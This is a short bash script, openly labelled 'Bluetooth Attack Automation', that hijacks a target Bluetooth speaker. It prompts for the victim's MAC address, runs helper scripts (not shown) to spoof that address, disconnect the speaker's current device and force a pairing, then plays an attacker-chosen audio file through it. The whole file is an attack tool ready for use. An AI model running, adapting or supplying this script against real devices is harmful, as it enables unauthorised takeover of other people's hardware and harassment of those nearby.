#!/bin/bash
# Master script to automate Bluetooth attack steps

echo "-----------------------------------"
echo "    Bluetooth Attack Automation    "
echo "-----------------------------------"

# Check for required tools
echo "[*] Checking for required tools..."
for tool in bluetoothctl hcitool l2ping macchanger; do
    if ! command -v $tool &> /dev/null; then
        echo "[-] $tool is not installed. Please install it and rerun this script."
        exit 1
    fi
done
echo "[+] All required tools are available."

# Prompt the attacker for the target MAC address
read -p "[?] Enter the MAC address of the target Bluetooth speaker: " TARGET_MAC

# Spoof the MAC address
read -p "[?] Enter the attacker's Bluetooth interface (e.g., hci0): " INTERFACE
echo "[*] Spoofing MAC address..."
./tools/spoof_mac.sh $TARGET_MAC $INTERFACE

# Disconnect existing device
echo "[*] Disconnecting existing connection on the speaker..."
./tools/disconnect.sh $TARGET_MAC

# Pair and connect to the target
echo "[*] Attempting to pair and connect to the target device..."
./tools/scan_and_pair.sh $TARGET_MAC

# Play audio
echo "[*] Connection established. You can now stream audio using aplay."
read -p "[?] Enter the path to the audio file to play: " AUDIO_FILE
aplay -D bluealsa:DEV=$TARGET_MAC,PROFILE=a2dp $AUDIO_FILE

echo "[+] All tasks completed."

